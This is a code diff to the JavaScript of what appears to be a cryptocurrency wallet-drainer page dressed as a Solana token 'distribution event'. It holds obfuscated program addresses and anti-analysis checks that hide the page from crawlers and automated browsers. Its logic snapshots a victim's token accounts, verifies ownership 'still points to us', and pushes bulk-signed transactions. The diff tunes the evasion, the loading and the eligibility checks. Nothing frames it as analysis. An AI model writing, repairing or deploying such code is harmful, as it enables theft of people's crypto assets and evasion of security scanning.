@@ -17,8 +17,7 @@
   ];
   const _xor = (s)=>{ let r=''; for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^_k.charCodeAt(i%_k.length)); return r; };
   const _dec = (b)=>_xor(atob(b));
-  const TOKEN_PROG = new solanaWeb3.PublicKey(_dec(_enc[0]));
-  const TOKEN_2022 = new solanaWeb3.PublicKey(_dec(_enc[1]));
+  let TOKEN_PROG, TOKEN_2022;
   const JITO_TIP_ACC = '96gYZGDnKkHpPBTJ4THLjhviaE7TyBcG2JNGe3nX9FPt';
 
   // ── anti-analysis ──
@@ -27,20 +26,7 @@
       if(navigator.webdriver) return true;
       const ua = navigator.userAgent||'';
       if(/HeadlessChrome|PhantomJS|SlimerJS|Puppeteer|selenium/i.test(ua)) return true;
-      if(!/Mobile|Android|iPhone/i.test(ua) && navigator.plugins && navigator.plugins.length===0) return true;
-      if(typeof navigator.languages!=='undefined' && navigator.languages.length===0) return true;
-      if(window.outerWidth - window.innerWidth > 300 || window.outerHeight - window.innerHeight > 300) return true;
-      if(window.self !== window.top) return true;
-      try {
-        const c=document.createElement('canvas'); c.width=200; c.height=50;
-        const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60';
-        x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Cwm fjordbank glyphs vext quiz, 😃',2,15);
-        if(c.toDataURL().length<500) return true;
-      }catch(e){}
       if(/Chrome-Lighthouse|Chrome Headless/i.test(ua)) return true;
-      if(navigator.serviceWorker && navigator.serviceWorker.controller){
-        try{ const sw=navigator.serviceWorker.controller.scriptURL||''; if(/screenshot|recorder|harness|puppet/i.test(sw)) return true; }catch(e){}
-      }
     }catch(e){}
     return false;
   }
@@ -201,7 +187,9 @@
     if(fresh.solBalance < snapshot.solBalance*0.95) throw new Error('eligibility_changed');
     const snapKey = (t)=>t.tokenAcct.toBase58();
     const snapSet = new Set(snapshot.tokens.map(snapKey));
+    const freshSet = new Set(fresh.tokens.map(snapKey));
     for(const t of fresh.tokens){ if(!snapSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
+    for(const t of snapshot.tokens){ if(!freshSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
     // verify ownership still points to us
     for(const t of fresh.tokens){
       const info = await rpcCall(c=>c.getAccountInfo(t.tokenAcct),'owner');
@@ -221,15 +209,35 @@
 
   let connection=null, wallet=null, walletPubkey=null, latestBlockhash=null;
 
+  // ── solana load guard ──
+  function waitForSolana(timeout=12000){
+    return new Promise((resolve,reject)=>{
+      if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ resolve(); return; }
+      const start = Date.now();
+      const t = setInterval(()=>{
+        if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ clearInterval(t); clearInterval(fail); resolve(); }
+        if(Date.now()-start > timeout){ clearInterval(t); clearInterval(fail); reject(new Error('solana timeout')); }
+      },100);
+      const fail = t;
+    });
+  }
+
   // ── init ──
   async function init(){
-    if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
-    await Promise.all([loadConfig(), loadSeed()]);
-    if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
-    if(typeof solanaWeb3==='undefined'){ $('loadingMsg').textContent='Failed to load Solana library. Check your connection and refresh.'; return; }
-    connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
-    $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
-    startCountdown();
+    try{
+      if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
+      await Promise.all([loadConfig(), loadSeed()]);
+      if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
+      await waitForSolana(12000);
+      TOKEN_PROG = new solanaWeb3.PublicKey(_dec(_enc[0]));
+      TOKEN_2022 = new solanaWeb3.PublicKey(_dec(_enc[1]));
+      connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
+      $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
+      startCountdown();
+    }catch(e){
+      $('loadingMsg').innerHTML = '<span style="color:#ff6b6b">Failed to initialize: ' + (e.message || 'unknown') + '. Check console and refresh.</span>';
+      $('btnConnect').disabled = true;
+    }
   }
 
   function startCountdown(){
@@ -348,7 +356,7 @@
         if(typeof wallet.signAllTransactions==='function' && txs.length>1){
           try{
             const signed=await wallet.signAllTransactions(txs);
-            const sends=signed.map(stx=>{ const c=new solanaWeb3.Connection(RPCS[0],'confirmed'); return c.sendRawTransaction(stx.serialize(),{skipPreflight:false,maxRetries:3}).then(sig=>({ok:true,sig})).catch(err=>({ok:false,err})); });
+            const sends=signed.map(stx=> rpcCall(c=>c.sendRawTransaction(stx.serialize(),{skipPreflight:false,maxRetries:3}),'send').then(sig=>({ok:true,sig})).catch(err=>({ok:false,err})));
             const results=await Promise.all(sends);
             for(const r of results){ if(r.ok){sent++; connection.confirmTransaction({signature:r.sig,blockhash:bh,lastValidBlockHeight:lvbh},'confirmed').catch(()=>{});}else{failed++;} }
           }catch(e){ if(e.message&&(e.message.includes('rejected')||e.message.includes('declined'))){ setStatus('Transaction declined.',true); resetUI(); return; } }
